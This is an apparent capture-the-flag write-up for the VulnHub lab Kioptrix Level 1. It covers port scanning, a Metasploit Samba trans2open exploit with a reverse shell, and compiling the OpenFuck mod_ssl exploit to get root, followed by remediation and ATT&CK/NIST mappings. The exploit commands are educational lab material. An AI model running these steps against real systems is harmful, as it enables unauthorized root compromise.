# Kioptrix: Level 1 — The Classic That Started It All

Dude, Kioptrix Level 1 is THE classic. Released in 2010, this was one of the very first VulnHub machines and became the de facto starting point for an entire generation of security learners. Running Apache 1.3.20, mod_ssl 2.8.4, and Samba 2.2.1a on a Linux 2.4 kernel from around 2002, it is a museum piece of vulnerabilities — but the techniques it teaches (remote buffer overflow via a well-known CVE, straight to root) are foundational. No fluff, no rabbit holes: exploit Samba, get root. Goated machine. fr fr.

This box taught thousands of people that version enumeration is everything. If you know what version something is running, you can look up whether it is exploitable. That is the entire lesson. Big respect to the creators of Kioptrix for open-sourcing security education.

---

| Field | Value |
|---|---|
| **Level** | Easy / Beginner |
| **Target VM** | Kioptrix: Level 1 (#1) |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ |
| **Techniques** | Nmap service and version enumeration, Nikto web vulnerability scan, Metasploit Samba trans2open exploit (CVE-2003-0201), direct root shell (no privilege escalation required) |
| **CVEs** | CVE-2003-0201 (Samba trans2open: remote buffer overflow in Samba 2.2.x, directly exploitable to root); CVE-2002-0082 (mod_ssl OpenFuck: buffer overflow in OpenSSL <= 0.9.6d, alternate path to root) |
| **APT Groups** | While these CVEs predate modern APT taxonomy, the exploitation pattern (exploit unpatched network service to remote root) remains the defining pattern of initial access for groups like APT28, APT41, and EternalBlue-era exploitation campaigns |

---

## Attack Summary

```
netdiscover → target: 192.168.1.109
    |
    v
nmap -A → Apache 1.3.20 (80), mod_ssl 2.8.4, Samba 2.2.1a (139/445)
    |
    v
nikto → confirms outdated Apache/mod_ssl, CVE-2002-0082 potential
    |
    v
PATH A: Metasploit trans2open (CVE-2003-0201)
    |    use exploit/linux/samba/trans2open
    |    set RHOST + LHOST + linux/x86/shell_reverse_tcp
    |    exploit
    |
    v
uid=0(root) — direct root via Samba overflow
    |
    v
OR:
    |
PATH B: OpenFuck (CVE-2002-0082)
    compile + run 0x6b or 0x6c offset → root shell
```

---

## Methodology

1. Network discovery with netdiscover
2. Full port and version scan with nmap
3. Web vulnerability scan with nikto (identifies outdated Apache/SSL)
4. Identify Samba 2.2.x as primary exploit target
5. Exploit CVE-2003-0201 via Metasploit trans2open
6. Receive direct root shell (no privilege escalation step)

---

## Step 1 — Host Discovery

```bash
sudo netdiscover -r 192.168.1.0/24
# or:
sudo arp-scan -l
```

Target identified at `192.168.1.109` (adjust for your network).

**MITRE ATT&CK:** T1018 — Remote System Discovery

---

## Step 2 — Port and Service Enumeration

```bash
nmap -A -p- 192.168.1.109
```

Key results:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2
80/tcp   open  http        Apache httpd 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn Samba 2.2.1a
443/tcp  open  ssl/https   Apache 1.3.20
```

Every version here is ancient and vulnerable. Apache 1.3.20, mod_ssl 2.8.4, Samba 2.2.1a, OpenSSH 2.9p2. This machine is running software that is 20+ years old, which is historically accurate for the era when Kioptrix 1 was created.

**The critical finding:** Samba 2.2.x is vulnerable to CVE-2003-0201 (trans2open), a remote buffer overflow that gives immediate root access without authentication.

**Secondary finding:** Apache 1.3.20 with mod_ssl 2.8.4 and OpenSSL 0.9.6b is vulnerable to CVE-2002-0082 (OpenFuck). The exploit requires compilation and version offset matching but also delivers root.

**Real-world note:** Software version detection is the cornerstone of vulnerability assessment. Every major vulnerability scanner (Nessus, OpenVAS, Qualys) starts here. When you see a 22-year-old Samba running on a production system, the conversation is not "is it vulnerable?" but "which of the 15 CVEs should I prioritize?" This pattern (unpatched network services with public RCE exploits) drives more real-world breaches than any advanced technique.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1082 — System Information Discovery

---

## Step 3 — Web Vulnerability Scan

```bash
nikto -h http://192.168.1.109
```

Nikto confirms:
- Apache 1.3.20 with known vulnerabilities
- mod_ssl 2.8.4 (CVE-2002-0082 candidate)
- Default files, directory listings

Nikto is useful as a quick sanity check but it does not detect the Samba vulnerability. For that, version detection from nmap is the signal.

**MITRE ATT&CK:** T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 4 — Exploitation: Samba trans2open (CVE-2003-0201)

Samba 2.2.x has a remote buffer overflow in the `trans2open` function (CVE-2003-0201). Metasploit provides a reliable module for this.

```bash
msfconsole
```

```
use exploit/linux/samba/trans2open
set RHOST 192.168.1.109
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.2   # your attacker IP
set LPORT 4444
exploit
```

If the meterpreter payload fails, switch to a raw shell:

```
set PAYLOAD linux/x86/shell_reverse_tcp
exploit
```

**Expected result:** shell with `uid=0(root)`. No privilege escalation required. The buffer overflow runs in the context of the Samba daemon, which runs as root on this configuration.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

**MITRE ATT&CK:** T1210 — Exploitation of Remote Services; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Alternate Path: OpenFuck (CVE-2002-0082)

If you want to practice the manual exploitation path, CVE-2002-0082 (mod_ssl/OpenSSL buffer overflow) is available.

```bash
# Download the exploit
searchsploit "apache mod_ssl" | grep -i "764"
# or find it at EDB-764

# The exploit requires OpenSSL 0.9.6 headers to compile
apt-get install libssl-dev

# Compile
gcc -o OpenFuck 764.c -lcrypto

# Identify the correct offset (0x6b = RedHat 7.2 Apache 1.3.20, 0x6c for another version)
./OpenFuck | grep -i "redhat"
./OpenFuck 0x6b 192.168.1.109 -c 40
```

The manual path teaches how to use legacy exploit code, which is a real skill when dealing with older systems or CVEs that lack Metasploit modules.

**MITRE ATT&CK:** T1210 — Exploitation of Remote Services

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| Root shell | uid=0(root) | Via Samba CVE-2003-0201 or mod_ssl CVE-2002-0082 | Direct root, no privesc needed |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Samba 2.2.x (CVE-2003-0201) unpatched | Unpatched network services with public RCEs are the single most common initial access vector | Version enumeration is everything: if you know the version, you know the exploits |
| 2 | Apache 1.3.20 + mod_ssl 2.8.4 (CVE-2002-0082) | End-of-life web stacks running in production expose entire systems to public exploits | Replace EOL software immediately; EOL = no security patches |
| 3 | Buffer overflow to direct root | Some daemons run as root; exploiting them skips privilege escalation entirely | Network services should run as non-privileged users; use systemd service sandboxing |
| 4 | Multiple simultaneous CVEs | A machine running software from 2002 has dozens of unpatched CVEs, all publicly known | Maintain a vulnerability management program; patch or compensating controls are required |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 |
| Reconnaissance | Discovery | Remote System Discovery | T1018 |
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | System Information Discovery | T1082 |
| Initial Access | Initial Access | Exploitation of Remote Services (Samba CVE-2003-0201) | T1210 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Upgrade Samba immediately**: Samba 2.2.x reached EOL in 2004; upgrade to current supported release or disable SMB if not needed
2. **Replace Apache 1.3.20**: Apache 1.x reached EOL in 2010; replace with Apache 2.4.x or nginx with current security patches
3. **Replace OpenSSL 0.9.6b**: Upgrade to a currently supported OpenSSL release
4. **Upgrade OpenSSH 2.9p2**: Multiple known vulnerabilities; upgrade to current release
5. **Run services as non-root**: Use systemd service sandboxing (`User=samba`, `NoNewPrivileges=yes`)
6. **Firewall SMB**: If Samba is required for internal use only, block ports 139/445 at the network perimeter

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all network services with version information |
| Protect | Protective Technology | Patch or replace all EOL software |
| Protect | Access Control | Run services as non-privileged users; firewall unused service ports |
| Detect | Continuous Monitoring | Scan for vulnerable service versions with authenticated vulnerability scanner |
| Respond | Response Planning | Isolate compromised host; audit all accounts for persistence |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-2 | Flaw Remediation | Patch EOL software within defined SLA; no unsupported software in production |
| CM-7 | Least Functionality | Disable SMB if not needed; remove unused network services |
| AC-6 | Least Privilege | Run network services as non-root users |
| RA-5 | Vulnerability Monitoring and Scanning | Scan all production hosts for known CVEs with authenticated scanning |

### CISA KEV

CVE-2003-0201 (Samba trans2open) and CVE-2002-0082 (OpenSSL mod_ssl) represent the class of unpatched legacy software vulnerabilities that CISA's Known Exploited Vulnerabilities catalog was designed to address. CISA Binding Operational Directive 22-01 requires federal agencies to remediate KEV entries within defined timeframes. Organizations using EOL software are advised to upgrade immediately or implement compensating controls.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 |
| Supply Chain and Dependencies (SCRM) | Manage ICT Supply Chain Risk | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-SU** — Software Update (patch Samba, Apache, OpenSSL to current supported versions)
- **D3-NTF** — Network Traffic Filtering (firewall SMB ports 139/445 at perimeter)
- **D3-OAM** — Operating System Administrative Management (run services as non-root)

---

## Final Thoughts

Kioptrix Level 1 is not a sophisticated machine. It is an honest one. The lesson is simple, timeless, and still relevant in 2024: if you run software with public RCE exploits and no patches, attackers will get root. No social engineering, no zero-days, no complex chains needed. Just `nmap`, `msfconsole`, and `exploit`.

The Kioptrix series (Levels 1 through 5) is still one of the best progressive learning paths in VulnHub. Start here, progress through all five, and you will have covered a solid foundation of classic exploitation techniques.

dude this machine literally taught a generation how to hack. Respect. gg

Thanks guys!! (❍ᴥ❍ʋ)
